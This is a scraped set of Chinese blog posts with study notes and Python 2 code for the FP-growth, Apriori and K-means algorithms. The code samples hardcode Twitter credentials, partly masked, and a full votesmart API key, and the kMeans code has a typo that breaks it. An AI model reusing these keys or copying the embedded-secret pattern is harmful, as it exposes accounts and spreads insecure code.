FP树通过链接来连接相似元素，被连接的元素项可以看成一个链表。与搜索树不同的是，一个元素项可以在FP树中出现多次，FP树会存储项集的出现频率，而每个项集以路径的方式存储在树中（类似字典树），存在相似元素的集合会共享树的一部分。树节点上给出集合中的单个元素及其在序列中的出现次数，路径会给出该序列的出现次数。 下表是用来生成下面示例的FP树的数据。生成FP树的事务数据样例事务ID事务中的元素项001r, z, h, j, p002z, y, x, w, v, u, t, s003z004r, x, n, o, s005y, r, x, z, q, t, p006y, z, x, e, q, s, t, m 构建FP树 为FP树建立新的数据类，定义如下，fpGrowth.py。 123456789101112131415class treeNode: def __init__(self, nameValue, numOccur, parentNode): self.name = nameValue self.count = numOccur self.nodeLink = None self.parent = parentNode self.children = &#123;&#125; def inc(self, numOccur): self.count += numOccur def disp(self, ind = 1): print ' '*ind, self.name, ' ', self.count for child in self.children.values(): child.disp(ind+1) 除了FP树外，还需要一个头指针表headerTable来存储FP树中元素第一次出现的位置和该元素的总数。上例中FP树的headerTable如下。 构造FP树过程如下：第一次遍历数据集会获得每个元素项的出现频率，之后去掉不满足最小支持度的元素项。再下一步构建FP树，读入每个项集并将其添加到一条路径中，若路径不存在则新建。每个事务都是一个无序集合，为了保证相同元素项只出现一次，需要对每个过滤后的事务中的元素项排序后再添加到树中，排序基于元素项的绝对出现频率由大到小开始。构造过程如下图。 建树代码如下。函数createTree使用处理好的数据集和最小支持度作为参数，返回建好的FP树和FP树的headerTable。函数updateTree输入参数为一个项集、当前的FP树、当前FP树的headerTable和当前项集出现次数，updateTree将这个项集插入到当前的FP树中，具体实现是如果这个项集只有一个元素，那么如果这个元素已经存在FP树中，就增加它的count值，否则为它在当前FP树下新分配一个节点，并更新headerTable，如果这个项集不止一个元素，那么对剩下的元素递归调用updateTree。updateHeader是updateTree的子函数，用来更新headerTable，确保节点链接指向树中该元素项的每个实例。 12345678910111213141516171819202122232425262728293031323334353637383940def createTree(dataSet, minSup = 1): headerTable = &#123;&#125; for trans in dataSet: for item in trans: headerTable[item] = headerTable.get(item, 0) + dataSet[trans] for k in headerTable.keys(): if headerTable[k] &lt; minSup: del(headerTable[k]) freqItemSep = set(headerTable.keys()) if len(freqItemSep) == 0: return None, None for k in headerTable: headerTable[k] = [headerTable[k], None] retTree = treeNode('Null Set', 1, None) for tranSet, count in dataSet.items(): localD = &#123;&#125; for item in tranSet: if item in freqItemSep: localD[item] = headerTable[item][0] if len(localD) &gt; 0: orderedItems = [v[0] for v in sorted(localD.items(),\\ key = lambda p: p[1], reverse = True)] updateTree(orderedItems, retTree, headerTable, count) return retTree, headerTabledef updateTree(items, inTree, headerTable, count): if items[0] in inTree.children: inTree.children[items[0]].inc(count) else: inTree.children[items[0]] = treeNode(items[0], count, inTree) if headerTable[items[0]][1] == None: headerTable[items[0]][1] = inTree.children[items[0]] else: updateHeader(headerTable[items[0]][1], inTree.children[items[0]]) if len(items) &gt; 1: updateTree(items[1::], inTree.children[items[0]], headerTable, count)def updateHeader(nodeToTest, targetNode): while (nodeToTest.nodeLink != None): nodeToTest = nodeToTest.nodeLink nodeToTest.nodeLink = targetNode 建树使用的数据集是处理过原始数据得到的一个字典。 1234567891011121314def loadSimpDat(): simpDat = [['r', 'z', 'h', 'j', 'p'], ['z', 'y', 'x', 'w', 'v', 'u', 't', 's'], ['z'], ['r', 'x', 'n', 'o', 's'], ['y', 'r', 'x', 'z', 'q', 't', 'p'], ['y', 'z', 'x', 'e', 'q', 's', 't', 'm']] return simpDatdef createInitSet(dataSet): retDict = &#123;&#125; for trans in dataSet: retDict[frozenset(trans)] = 1 return retDict 上面代码对simpDat建立的FP树如下。 12345678910111213141516&gt;&gt;&gt; simpDat = fpGrowth.loadSimpDat()&gt;&gt;&gt; initSet = fpGrowth.createInitSet(simpDat)&gt;&gt;&gt; myFpTree, myHeaderTab = fpGrowth.createTree(initSet, 3)&gt;&gt;&gt; myFpTree.disp() Null Set 1 x 1 s 1 r 1 z 5 x 3 y 3 s 2 t 2 r 1 t 1 r 1 从FP树中挖掘频繁项集 从FP树获取频繁项集的步骤如下：从FP树中获取条件模式基，利用条件模式基构建一个条件FP树，迭代上面两步，直到树包含一个元素项为止。 抽取条件模式基 对于保存在headerTable中的每一个元素项，他们自身都是一个长度为一的频繁项集，首先要获得其对应的条件模式基。条件模式基是以所查找元素项为结尾的路径集合，每条路径都是一条前缀路径。例如在最初的FP树例子中，元素r的前缀路径是{x,s}、{z,x,y}和{z}，而这每一条前缀路径都对应一个计数值，计数值等于起始元素项的计数值，这里就是r出现的次数（1次）。这些前缀路径会被用来构建条件FP树，因为headerTable中包含了每个元素第一次出现的位置，因此可以通过headerTable遍历每个元素并且上溯整棵树到根节点。 函数ascendTree用来迭代上溯整棵树，findPrefixPath用来找到参数basePat对应的所有条件模式基，期间不停调用ascendTree。 1234567891011121314151617def ascendTree(leafNode, prefixPath): if leafNode.parent != None: prefixPath.append(leafNode.name) ascendTree(leafNode.parent, prefixPath)def findPrefixPath(basePat, treeNode): condPats = &#123;&#125; while treeNode != None: prefixPath = [] ascendTree(treeNode, prefixPath) if len(prefixPath) &gt; 1: condPats[frozenset(prefixPath[1:])] = treeNode.count treeNode = treeNode.nodeLink return condPats&gt;&gt;&gt; fpGrowth.findPrefixPath('r', myHeaderTab['r'][1])&#123;frozenset(['x', 's']): 1, frozenset(['z']): 1, frozenset(['y', 'x', 'z']): 1&#125; 创建条件FP树 对于每一个频繁项都要创建一棵条件FP树，使用条件模式基作为输入数据，用相同的建树代码构建条件树，之后递归地发现频繁项、发现条件模式基，并且继续构造条件树，直到条件树中没有元素。 函数mineTree对参数inTree代表的FP树进行频繁项集挖掘。首先对headerTable中出现的单个元素按出现频率从小到大排序，之后将每个元素的条件模式基作为输入数据，建立针对当前元素的条件树，如果生成的这棵条件树仍有元素，就在这棵条件树里寻找频繁项集，因为prefix参数是在递归过程中不断向下传递的，因此由最初的headerTable中的某个元素x衍生出的所有频繁项集都带有x。 123456789101112def mineTree(inTree, headerTable, minSup, preFix, freqItemList): bigL = [v[0] for v in sorted(headerTable.items(), key = lambda p: p[1])] for basePat in bigL: newFreqSet = preFix.copy() newFreqSet.add(basePat) freqItemList.append(newFreqSet) condPattBases = findPrefixPath(basePat, headerTable[basePat][1]) myCondTree, myHead = createTree(condPattBases, minSup) if myHead != None: print 'conditional tree for: ', newFreqSet myCondTree.disp(1) mineTree(myCondTree, myHead, minSup, newFreqSet, freqItemList) mineTree函数递归过程稍微复杂，可以通过下面这幅图（链接是图的原作者）来了解。在mineTree的for basePat in bigL中，当前的basePat是t的情况下的递归过程。下面是代码运行时以t为basePat情况下的部分输出。 1234567891011121314151617&gt;&gt;&gt; freqItems = []&gt;&gt;&gt; fpGrowth.mineTree(myFpTree, myHeaderTab, 3,set([]), freqItems)conditional tree for: set(['t']) Null Set 1 y 3 x 3 z 3conditional tree for: set(['x', 't']) Null Set 1 y 3conditional tree for: set(['z', 't']) Null Set 1 y 3 x 3conditional tree for: set(['x', 'z', 't']) Null Set 1 y 3 在Twitter源中发现关键词 使用python-twitter库，链接是源代码和Twitter API文档，最好直接阅读python-twitter在github上源代码中的api.py文件。使用API需要从twitter开发服务网站获得两个app开发证书集合。 函数getLotsOfTweets处理OAuth认证并从twitter获取搜索相关的1400条推文。textParse将获取到的推文处理，mineTweets对每条推文调用textParse，生成FP树并返回所有频繁项集组成的list。注释掉的api.VerifyCredentials()可以查看api是否授权成功。作者写书时候的api现在已经更新了，GetSearch方法里的per_page和page参数都已经取消，现在是count和since_id，另外有一个since参数是起始日期，格式XXXX-XX-XX，因为是用pip安装的python-twitter，和github上的源码不同步，这里没有用。 1234567891011121314151617181920212223242526272829303132333435363738import twitterfrom time import sleepimport redef getLotsOfTweets(searchStr): CONSUMER_KEY = \"a9TIv9g****84UScUZ3Zk30uA\" CONSUMER_SECRET =\"4qcZYvP8RWjK****akMJEPuvu0kZq0vfSc45JOENLpwDiyhFh1\" ACCESS_TOKEN_KEY = \"702455247084453888-****3kaZzXIu1NmNoSFvGNFSx3z5P6Z\" ACCESS_TOKEN_SECRET = \"fldNq1f0oHUqOafR****01uxWGxCLJt253lKPCbrX0acx\" api = twitter.Api(consumer_key = CONSUMER_KEY,\\ consumer_secret = CONSUMER_SECRET,\\ access_token_key = ACCESS_TOKEN_KEY,\\ access_token_secret = ACCESS_TOKEN_SECRET) resultsPages = [] for i in range(1,15): print \"fetching page %d\" % i searchResults = api.GetSearch(searchStr, count = 100, since_id = i) #, since=\"2016-02-21\") resultsPages.append(searchResults) sleep(6) return resultsPagesdef textParse(bigString): urlsRemoved = re.sub('(http[s]?:[/][/]|www.)([a-z]|[A-Z]|[0-9]|[/.]|[-])*',\\ '', bigString) listOfTokens = re.split(r'\\W*', urlsRemoved) return [tok.lower() for tok in listOfTokens if len(tok) &gt; 2]def mineTweets(tweetArr, minSup=5): parsedList = [] for i in range(14): for j in range(100): parsedList.append(textParse(tweetArr[i][j].text)) initSet = createInitSet(parsedList) myFPtree, myHeaderTab = createTree(initSet, minSup) myFreqList = [] mineTree(myFPtree, myHeaderTab, minSup, set([]), myFreqList) return myFreqList 运行结果如下。现在是2月24日，2月22日苹果和FBI之间的争论开始，用Apple作为关键词看一下最近的记录。lotsOfTweets的下标是我随机抽取的，大部分都和FBI有关。得到频繁项集可以发现有许多都是fbi、iphone、cifrado等组成，和最近的热点相近。 12345678910111213141516171819202122232425&gt;&gt;&gt; lotsOfTweets = fpGrowth.getLotsOfTweets('Apple')fetching page 1fetching page 2....https://t.co/rjhZgCPXbC #Apple'&gt;&gt;&gt; lotsOfTweets[0][89].textu'RT @BIUK_Tech: Apple will use a free speech defence in its war \\with the FBI $AAPL https://t.co/1rI51zTq8p'&gt;&gt;&gt; lotsOfTweets[1][89].textu'Watch Bill Gates talk about the privacy debate between Apple and\\ the FBI https://t.co/8mQ5smXOYE'&gt;&gt;&gt; lotsOfTweets[2][14].textu\"'Perang Panas' FBI Vs Apple, Publik AS Terbelah: Mayoritas publik\\ yang disurvei mendukung FBI. https://t.co/ZNmPT699b1\"&gt;&gt;&gt; listOfTerms = fpGrowth.mineTweets(lotsOfTweets, 20)&gt;&gt;&gt; len(listOfTerms)1570&gt;&gt;&gt; for t in listOfTerms:... if len(t) == 3 and 'fbi' in t:... print tset([u'fbi', u'cifrado', u'entender'])set([u'fbi', u'cifrado', u'iphone'])set([u'fbi', u'del', u'cifrado'])set([u'fbi', u'entender', u'con'])set([u'fbi', u'iphone', u'entender']) FP-growth算法总结 FP-growth算法是一种用于发现数据集中频繁模式的有效方法，利用Apriori原则执行，支队数据集扫描两遍。数据及存储在FP树结构中，该树构建完成后，通过查找元素项的条件模式基、构建条件FP树来发现频繁项集并递归此过程。 参考文献： 《机器学习实战 - 美Peter Harrington》 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2016/02/24/machinelearning12/) 、作者信息（Forec）和本声明。","categories":[{"name":"大数据/分布式系统","slug":"大数据-分布式系统","permalink":"http://forec.github.io/categories/大数据-分布式系统/"}],"tags":[{"name":"Algorithms","slug":"Algorithms","permalink":"http://forec.github.io/tags/Algorithms/"},{"name":"机器学习","slug":"机器学习","permalink":"http://forec.github.io/tags/机器学习/"}],"keywords":[{"name":"大数据/分布式系统","slug":"大数据-分布式系统","permalink":"http://forec.github.io/categories/大数据-分布式系统/"}]},{"title":"机器学习笔记（Chapter 11 - Apriori算法）","slug":"machinelearning11","date":"2016-02-22T13:17:17.000Z","updated":"2017-08-22T07:30:20.000Z","comments":true,"path":"2016/02/22/machinelearning11/","link":"","permalink":"http://forec.github.io/2016/02/22/machinelearning11/","excerpt":"商店通过会员卡等忠诚度计划，可以获取顾客所购买商品的组合信息，从而更好地安排商品定价、市场促销等。从大规模数据集中寻找物品间的隐含关系被称作关联分析或者关联规则学习。Apriori算法可以解决计算代价极高的物品组合问题，从而在合理的时间范围内找到频繁项集和关联规则。","text":"商店通过会员卡等忠诚度计划，可以获取顾客所购买商品的组合信息，从而更好地安排商品定价、市场促销等。从大规模数据集中寻找物品间的隐含关系被称作关联分析或者关联规则学习。Apriori算法可以解决计算代价极高的物品组合问题，从而在合理的时间范围内找到频繁项集和关联规则。 关联分析 关联分析是一种在大规模数据集中寻找关系的任务，这些关系可以有两种形式：频繁项集或者关联规则。频繁项集是经常出现在一起的物品的集合，关联规则暗示两种物品之间存在很强的因果关系。经典的例子如“啤酒与尿布”。 定义“频繁”和“关联”：一个项集的支持度被定义为数据集中包含该项集的记录所占的比例。可信度或置信度是针对一条例如{尿布}→{啤酒}的关联规则定义的，这条规则的可信度被定义为支持度({尿布，啤酒})/支持度({尿布})。假设这条规则的置信度是75%，那么对于所有包含“尿布”的记录，这条规则对其中的75%都适用。 Apriori原理 Apriori算法易于编写，但在大数据集上效率不高。适用于数值型或者标称型数据。 假设现在有n件商品，不考虑购买的数量重叠，消费者购买的可能组合就有2^n-1种。这2^N-1种项集组合无法全部遍历，因此通过Apriori原理过滤到不可能“频繁”出现的项集。Apriori原理指如果某个项集是频繁的，那么它的所有子集也是频繁的。实际应用时，通常对原理取反：如果一个项集是非频繁集，那么它的所有超集也都是非频繁的。Apriori意指“来自以前”，即定义问题时通常使用先验知识或者假设，例如在贝叶斯统计中使用先验知识作为条件进行推断，这些先验知识可能来自领域知识、先前的测量结果等。 Apriori算法通过已经得到的支持度达标的项集来构造更复杂的项集，因此可以看作迭代的过程。初始状态每个项集仅包含一个物品，通过统计这些长度为1的项集的支持度，筛选掉不达标的项集，再用达标项集生成长度为2的项集。过程不断重复直到所有的项集筛选完成。 Apriori算法寻找频繁集生成候选项集 函数createC1()用于构建集合C1。Ck是大小为k的所有候选项集集合，注意生成的C1通过map冰冻，意味着每个值都无法改变。scanD函数用于从Ck中筛选出支持度符合要求的项集，构成集合Lk。loadDataSet初始化一个数据集。 123456789101112131415161718192021222324252627282930from numpy import *def loadDataSet(): return [[1,3,4], [2,3,5], [1,2,3,5], [2,5]]def createC1(dataSet): C1 = [] for transcation in dataSet: for item in transcation: if not [item] in C1: C1.append([item]) C1.sort() return map(frozenset, C1)def scanD(D, Ck, minSupport): ssCnt = &#123;&#125; for tid in D: for can in Ck: if can.issubset(tid): if not ssCnt.has_key(can): ssCnt[can] = 1 else: ssCnt[can] += 1 numItems = float(len(D)) retList = [] supportData = &#123;&#125; for key in ssCnt: support = ssCnt[key]/numItems if support &gt;= minSupport: retList.insert(0, key) supportData[key] = support return retList, supportData 对原始数据集初始化后的C1，L1如下。 12345678910&gt;&gt;&gt; import apriori&gt;&gt;&gt; dataSet= apriori.loadDataSet()[[1, 3, 4], [2, 3, 5], [1, 2, 3, 5], [2, 5]]&gt;&gt;&gt; C1 = apriori.createC1(dataSet)[frozenset([1]), frozenset([2]), frozenset([3]), frozenset([4]), frozenset([5])]&gt;&gt;&gt; D = map(set, dataSet)[set([1, 3, 4]), set([2, 3, 5]), set([1, 2, 3, 5]), set([2, 5])]&gt;&gt;&gt; L1, supportData0 = apriori.scanD(D, C1, 0.5)[frozenset([1]), frozenset([3]), frozenset([2]), frozenset([5])]&#123;frozenset([4]): 0.25, frozenset([5]): 0.75, frozenset([2]): 0.75, frozenset([3]): 0.75, frozenset([1]): 0.5&#125; 组织完整的Apriori算法 Apriori整个算法流程如下：当当前集合Lk中的筛选出的频繁项集数大于0，则生成Ck+1，直到所有可能的组合都筛选完成。函数aprioriGen取频繁项集列表Lk和k作为参数，生成Ck，具体实现是对Lk中的每个元素，比较这个元素和其他元素，如果两个元素有k-1个项相同，就可以将两个元素合并成Ck+1中的一个。apriori函数取数据集、支持度作为参数，首先用createC1创建C1，用scanD筛选出L1，之后迭代生成Lk。apriori函数返回所有的频繁项集和项集的支持度。 123456789101112131415161718192021222324def aprioriGen(Lk, k): retList = [] lenLk = len(Lk) for i in range(lenLk): for j in range(i+1, lenLk): L1 = list(Lk[i])[:k-2]; L2 = list(Lk[j])[:k-2] L1.sort(); L2.sort() if L1 == L2: retList.append(Lk[i] | Lk[j]) return retListdef apriori(dataSet, minSupport = 0.5): C1 = createC1(dataSet) D = map(set, dataSet) L1, supportData = scanD(D, C1, minSupport) L = [L1] k = 2 while (len(L[k-2]) &gt; 0): Ck = aprioriGen(L[k-2], k) Lk, supK = scanD(D, Ck, minSupport) supportData.update(supK) L.append(Lk) k += 1 return L, supportData 执行效果。 12345&gt;&gt;&gt; reload(apriori)&gt;&gt;&gt; L, suppData = apriori.apriori(dataSet)[[frozenset([1]), frozenset([3]), frozenset([2]), frozenset([5])], [frozenset([1, 3]), frozenset([2, 5]), frozenset([2, 3]), frozenset([3, 5])], [frozenset([2, 3, 5])], []]&gt;&gt;&gt; apriori.aprioriGen(L[0], 2)[frozenset([1, 3]), frozenset([1, 2]), frozenset([1, 5]), frozenset([2, 3]), frozenset([3, 5]), frozenset([2, 5])] 从频繁项集中挖掘关联规则 关联规则不一定是可逆的，{尿布}→{啤酒}不意味着{啤酒}→{牛奶}。对于一个频繁项，可以将其中包含的元素划分为两部分，左端称为前件，如{尿布}→{啤酒}中的尿布，右端称为后件。对于一个固定的频繁项，前件与后件的元素个数之和固定，但前件后件数目可以调配。为了减少产生的规则数目，可以发现，如果某条规则并不满足最小可信度要求，那么这条规则的所有子集也不满足最小可信度要求。例如，{0，1，2}→{3}的规则不满足可信度，则所有前件是{0，1，2}子集的规则都不满足可信度。 构造方法如下：首先从一个频繁项集开始，创建一个规则列表，其中规则右部只包含一个元素，然后对这些规则测试，接下来合并所有剩余规则来创建一个新的规则列表，此时右部包含两个元素，以此类推，称为分级法。函数generateRules取频繁项集列表L、项集支持度supportData和最小可信阈值minConf作为参数，遍历L中的每一个频繁项集并对每个频繁项集创建只包含单个元素集合的列表H1。注意因为无法从单个元素的项集中构建关联规则，所以从包含两个或者更多元素的项集开始。如果频繁项集的元素数目大于2，则考虑对其做进一步合并，产生其他规则，通过rulesFromConseq完成，否则直接calcConf计算可信值。rulesFromConseq中的if (len(freqSet)&gt;(m+1))的判断目的在于确定当前的频繁项是否大到可以移除长为m的子集。 12345678910111213141516171819202122232425262728def generateRules(L, supportData, minConf = 0.7): bigRuleList = [] for i in range(1, len(L)): for freqSet in L[i]: H1 = [frozenset([item]) for item in freqSet] if (i &gt; 1): rulesFromConseq(freqSet, H1, supportData, bigRuleList, minConf) else: calcConf(freqSet, H1, supportData, bigRuleList, minConf) return bigRuleListdef calcConf(freqSet, H, supportData, brl, minConf = 0.7): prunedH = [] for conseq in H: conf = supportData[freqSet]/supportData[freqSet-conseq] if conf &gt;= minConf: print freqSet-conseq, '--&gt;', conseq, 'conf:', conf brl.append((freqSet-conseq, conseq, conf)) prunedH.append(conseq) return prunedHdef rulesFromConseq(freqSet, H, supportData, brl, minConf = 0.7): m = len(H[0]) if (len(freqSet) &gt; (m+1)): Hmp1 = aprioriGen(H, m+1) Hmp1 = calcConf(freqSet, Hmp1, supportData, brl, minConf) if (len(Hmp1) &gt; 1): rulesFromConseq(freqSet, Hmp1, supportData, brl, minConf) 执行结果 123456789101112131415161718&gt;&gt;&gt; reload(apriori)&gt;&gt;&gt; L, suppData = apriori.apriori(dataSet, minSupport = 0.5)&gt;&gt;&gt; rules = apriori.generateRules(L, suppData, minConf = 0.7)frozenset([1]) --&gt; frozenset([3]) conf: 1.0frozenset([5]) --&gt; frozenset([2]) conf: 1.0frozenset([2]) --&gt; frozenset([5]) conf: 1.0&gt;&gt;&gt; rules = apriori.generateRules(L, suppData, minConf = 0.5)frozenset([3]) --&gt; frozenset([1]) conf: 0.666666666667frozenset([1]) --&gt; frozenset([3]) conf: 1.0frozenset([5]) --&gt; frozenset([2]) conf: 1.0frozenset([2]) --&gt; frozenset([5]) conf: 1.0frozenset([3]) --&gt; frozenset([2]) conf: 0.666666666667frozenset([2]) --&gt; frozenset([3]) conf: 0.666666666667frozenset([5]) --&gt; frozenset([3]) conf: 0.666666666667frozenset([3]) --&gt; frozenset([5]) conf: 0.666666666667frozenset([5]) --&gt; frozenset([2, 3]) conf: 0.666666666667frozenset([3]) --&gt; frozenset([2, 5]) conf: 0.666666666667frozenset([2]) --&gt; frozenset([3, 5]) conf: 0.666666666667 发现国会投票中的模式和毒蘑菇的相似特征国会投票 智能投票工程提供了公共API来访问国会投票记录，Sunlight实验室写了一个python-votesmart用于访问该API。需要先注册一个API key。需要一个工作日左右来处理申请API请求，成功后的API授权代码会发送到注册邮箱。时差关系大概晚上注册会比较好。通过votesmart.apikey来告知votesmart库你的api授权代码，通过votesmart.votes.getBillsByStateRecent()来获取最近的100条议案，对于返回结果中的每条bill，可以查看bill.title和bill.billId。例如某条议案的ID是11820，可以通过votesmart.votes.getBill(11820)来获取详细信息。对于某个议案bill的投票行为，可以通过for action in bill.actions and action.stage==&#39;Passage&#39;来获得每个投票action。action.actionId可以得到这个投票行为的ID，例如某个投票action是31670，可以通过votesmart.votes.getBillActionVotes(31670)来获得详细信息。下面代码是Peter Harrington给出的，里面的api代码已经过期了。 12345678910111213141516171819202122from time import sleepfrom votesmart import votesmartvotesmart.apikey = 'a7fa40adec6f4a77178799fae4441030'#votesmart.apikey = 'get your api key first'def getActionIds(): actionIdList = []; billTitleList = [] fr = open('recent20bills.txt') for line in fr.readlines(): billNum = int(line.split('\\t')[0]) try: billDetail = votesmart.votes.getBill(billNum) #api call for action in billDetail.actions: if action.level == 'House' and \\ (action.stage == 'Passage' or action.stage == 'Amendment Vote'): actionId = int(action.actionId) print 'bill: %d has actionId: %d' % (billNum, actionId) actionIdList.append(actionId) billTitleList.append(line.strip().split('\\t')[1]) except: print \"problem getting bill %d\" % billNum sleep(1) #delay to be polite return actionIdList, billTitleList 下面的代码生成食物数据库，对每个actionId，抓取不同政客的投票。关系不大，不予讨论。 123456789101112131415161718192021222324252627def getTransList(actionIdList, billTitleList): #this will return a list of lists containing ints itemMeaning = ['Republican', 'Democratic']#list of what each item stands for for billTitle in billTitleList:#fill up itemMeaning list itemMeaning.append('%s -- Nay' % billTitle) itemMeaning.append('%s -- Yea' % billTitle) transDict = &#123;&#125;#list of items in each transaction (politician) voteCount = 2 for actionId in actionIdList: sleep(3) print 'getting votes for actionId: %d' % actionId try: voteList = votesmart.votes.getBillActionVotes(actionId) for vote in voteList: if not transDict.has_key(vote.candidateName): transDict[vote.candidateName] = [] if vote.officeParties == 'Democratic': transDict[vote.candidateName].append(1) elif vote.officeParties == 'Republican': transDict[vote.candidateName].append(0) if vote.action == 'Nay': transDict[vote.candidateName].append(voteCount) elif vote.action == 'Yea': transDict[vote.candidateName].append(voteCount + 1) except: print \"problem getting actionId: %d\" % actionId voteCount += 2 return transDict, itemMeaning 毒蘑菇相似特征 文件mushroom.dat的每一行第一个特征用1或者2表示可食用或有毒，其余列都是某种蘑菇的特征。通过apriori算法寻找包含特征值为2的频繁项集。 123456789101112131415161718&gt;&gt;&gt; mushDatSet = [line.split() for line in open('mushroom.dat').readlines()]&gt;&gt;&gt; L, suppData = apriori.apriori(mushDatSet, minSupport = 0.3)&gt;&gt;&gt; for item in L[1]:... if item.intersection('2'): print itemfrozenset(['2', '59'])frozenset(['39', '2'])frozenset(['2', '67'])frozenset(['2', '34'])frozenset(['2', '23'])....&gt;&gt;&gt; for item in L[3]:... if item.intersection('2'): print itemfrozenset(['63', '59', '2', '93'])frozenset(['39', '2', '53', '34'])frozenset(['2', '59', '23', '85'])frozenset(['2', '59', '90', '85'])frozenset(['39', '2', '36', '34']).... Apriori算法总结 关联分析适用于发现大数据集中元素间关系的一个工具集，可以通过频繁项集给出经常在一起出现的元素项或者关联规则给出元素项之间的因果关系来量化。Apriori算法减少了在数据库上检查的集合的数目，如果一个元素项是不频繁的，那么它的超集也都是不频繁的。关联分析可以用在许多不同物品上，商店商品购买和网站访问历史都是常见的例子。每次增加频繁项集的大小，Apriori算法都要重新扫描整个数据集，当数据集很大，这会掀桌降低频繁项集发现的速度。 参考文献： 《机器学习实战 - 美Peter Harrington》 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2016/02/22/machinelearning11/) 、作者信息（Forec）和本声明。","categories":[{"name":"大数据/分布式系统","slug":"大数据-分布式系统","permalink":"http://forec.github.io/categories/大数据-分布式系统/"}],"tags":[{"name":"Algorithms","slug":"Algorithms","permalink":"http://forec.github.io/tags/Algorithms/"},{"name":"机器学习","slug":"机器学习","permalink":"http://forec.github.io/tags/机器学习/"}],"keywords":[{"name":"大数据/分布式系统","slug":"大数据-分布式系统","permalink":"http://forec.github.io/categories/大数据-分布式系统/"}]},{"title":"机器学习笔记（Chapter 10 - K-均值聚类算法）","slug":"machinelearning10","date":"2016-02-21T13:07:41.000Z","updated":"2017-08-22T07:30:24.000Z","comments":true,"path":"2016/02/21/machinelearning10/","link":"","permalink":"http://forec.github.io/2016/02/21/machinelearning10/","excerpt":"聚类是一种无监督学习，将相似的对象归到同一个簇中，类似全自动分类，即类别体系也是自动构建的。聚类方法几乎可以应用于所有对性，簇内的对象越相似，聚类效果越好。K-均值聚类算法可以发现k个不同的簇，且每个簇的中心采用簇中所含值的均值构成。聚类与分类的区别在于，分类的目标事先已知，而聚类未知。","text":"聚类是一种无监督学习，将相似的对象归到同一个簇中，类似全自动分类，即类别体系也是自动构建的。聚类方法几乎可以应用于所有对性，簇内的对象越相似，聚类效果越好。K-均值聚类算法可以发现k个不同的簇，且每个簇的中心采用簇中所含值的均值构成。聚类与分类的区别在于，分类的目标事先已知，而聚类未知。 K-均值聚类 K-均值聚类算法的优点在于容易实现，缺点在于可能收敛到局部最小值，并且在大规模数据上收集较慢。适用于数值型数据。 K-均值聚类算法发现给定数据集的k个簇，这里的k是用户指定的，其的工作流程如下：首先随机确定k个初始点作为质心（注意这里的k个初始点不一定是数据集中的点，但一定在数据集的range内），然后对数据集中的每个点，寻找距离这个点最近的质心，并将其分配给这个质心对应的簇，该步完成后将每个簇的质心修改为该簇所有点的平均值。伪代码表示如下： 创建k个点作为起始质心（通常随机选择） 当任意一个点的簇分配结果发生改变时： &nbsp;&nbsp;&nbsp;&nbsp;对数据集中的每个点： &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对每个质心： &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;计算质心与数据点之间的距离 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将数据点分配到距离其最近的簇 &nbsp;&nbsp;&nbsp;&nbsp;对每一个簇，计算簇中所有点的均值并将均值作为质心。 K-均值算法要寻找最近的质心，因此需要进行某种距离计算，数据集上K-均值算法的性能会受到所选距离计算方法的影响。函数rendCent用于对数据集dataSet随机初始化k个簇质心，随机质心的大小在测试数据集的最小值和最大值之间。distEclud用于计算两个点之间的欧式距离，也可以切换成其他距离函数。 12345678910111213141516171819202122from numpy import *def loadDataSet(fileName): dataMat = [] fr = open(fileName) for line in fr.readlines(): curLine = line.strip().split('\\t') fltLine = map(float, curLine) dataMat.append(fltLine) return dataMatdef distEclud(vecA, vecB): return sqrt(sum(power(vecA - vecB, 2)))def randCent(dataSet, k): n = shape(dataSet)[1] centroids = mat(zeros((k,n))) for j in range(n): minJ = min(dataSet[:,j]) rangeJ = float(max(dataSet[:,j]) - minJ) centroids[:,j] = minJ + rangeJ * random.rand(k,1) return centroids 函数kMeans接受四个输入参数，用户需要指定数据集和划分的簇数k。kMeans函数一开始确定数据中数据点总数，clusterAssment记录簇分配结果，第一列记录簇索引值，第二列存储误差（当前点到簇的质心的距离）。按照计算质心-&gt;分配-&gt;重新计算的过程反复迭代，直到所有数据点的簇分配结果不再改变为止。选项axis=0表示沿着矩阵的列方向计算均值。 12345678910111213141516171819202122232425262728def kMeans(dataSet, k, distMeas = distEclud, createCent = randCent): m = shape(dataSet)[0] clusterAssment = mat(zeros((m,2))) centroids = createCend(dataSet, k) clusterChanged = True while clusterChanged: clusterChanged = False for i in range(m): minDist = inf; minIndex = -1 for j in range(k): distJI = distMeas(centroids[j,:], dataSet[i,:]) if distJI &lt; minDist: minDist = distJI; minIndex = j if clusterAssment[i,0] != minIndex: clusterChanged = True clusterAssment[i,:] = minIndex, minDist**2 #print centroids for cent in range(k): ptsInClust = dataSet[nonzero(clusterAssment[:,0].A == cent)[0]] centroids[cent,:] = mean(ptsInClust, axis=0) return centroids, clusterAssment&gt;&gt;&gt; import kMeans&gt;&gt;&gt; datMat = mat(kMeans.loadDataSet('testSet.txt'))&gt;&gt;&gt; myCentroids, clustAssing = kMeans.kMeans(datMat, 4)[[-2.46154315 2.78737555] [-3.38237045 -2.9473363 ] [ 2.80293085 -2.7315146 ] [ 2.6265299 3.10868015]] 二分K-均值算法 后处理：在K-均值聚类中簇的数目k是用户定义参数，可以利用clusterAssment中的误差值评价聚类分簇的正确性和质量。考虑下图的聚类结果，K-均值聚类算法收敛但聚类效果较差的原因是K-均值算法收敛到了局部最小值，而非全局最小值。可以使用SSE（误差平方和，clusterAssment[:,1]的和）评价聚类好坏，SSE值越小表示数据点越接近于它们的质心，聚类效果也越好。因为对误差取平方，因此更加重视远离质心的点。增加簇的个数必然降低SSE的值，但不符合聚类目标。一种方法是对聚类生成的簇进行后处理，将具有最大SSE值得簇划分为两个簇，具体实现只要将属于最大簇的数据点用K-均值聚类，设定簇数k=2即可。为了保证簇总数不变，可以合并最近的质心，或者合并两个使得SSE值增幅最小的质心。 二分K-均值类似后处理的切分思想，初始状态所有数据点属于一个大簇，之后每次选择一个簇切分成两个簇，这个切分满足使SSE值最大程度降低，直到簇数目达到k。另一种思路是每次选择SSE值最大的一个簇进行切分。前者伪代码如下。 将所有点看成一个簇 当簇数目小于k时 对于每一个簇： 